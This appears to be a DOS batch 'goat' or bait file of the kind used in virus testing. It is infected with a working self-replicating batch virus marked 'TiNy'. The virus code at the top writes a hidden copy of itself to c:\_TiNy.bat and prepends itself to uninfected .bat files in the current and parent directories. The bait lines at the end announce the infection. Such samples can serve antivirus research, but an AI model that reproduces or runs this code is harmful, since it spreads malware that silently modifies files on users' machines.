@echo off%_TiNy%
if '%1=='TiNy goto TiNy%2
set TiNy=%0.bat
if not exist %TiNy% set TiNy=%0
if '%TiNy%==' set TiNy=autoexec.bat
if exist c:\_TiNy.bat goto TiNyg
if not exist %TiNy% goto eTiNy
find "TiNy"<%TiNy%>c:\_TiNy.bat
attrib c:\_TiNy.bat +h
:TiNyg
command /c c:\_TiNy TiNy vir
:eTiNy
set TiNy=
goto TiNyend
:TiNyvir
for %%a in (*.bat ..\*.bat) do call c:\_TiNy TiNy i %%a
exit TiNy
:TiNyi
find "TiNy"<%3>nul
if not errorlevel 1 goto TiNyend
type c:\_TiNy.bat>TiNy$
type %3>>TiNy$
move TiNy$ %3>nul
exit TiNy
:TiNyend
@echo off
echo This is the SECOND line of the Goat file (the first is the @echo off)
echo.
echo THIS FILE IS INFECTED WITH A VIRUS!!!!!!!!!!!
echo.
echo This is the LAST line of the bait file.